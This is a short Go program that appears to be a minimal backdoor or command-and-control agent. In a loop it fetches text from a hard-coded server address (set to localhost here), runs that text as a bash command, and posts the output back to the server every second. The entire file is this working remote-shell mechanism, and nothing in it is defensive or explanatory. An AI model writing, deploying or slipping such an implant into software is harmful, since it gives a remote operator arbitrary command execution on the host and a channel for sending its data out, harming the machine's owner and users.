package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

const URL string = "http://localhost:5000"

func ret(output string) {
	formData := url.Values{}
	formData.Set("return", output)

	req, err := http.NewRequest("POST", URL, strings.NewReader(formData.Encode()))
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
func run(cmd2 string) {

	cmd := exec.Command("bash", "-c", cmd2)

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Error executing command: %v\n", err)
		return
	}

	ret(string(output))

}
func main() {
	for true {
		resp, _ := http.Get(URL)
		bytes, _ := io.ReadAll(resp.Body)
		fmt.Println(string(bytes))
		run(string(bytes))
		time.Sleep(time.Second)
	}
}
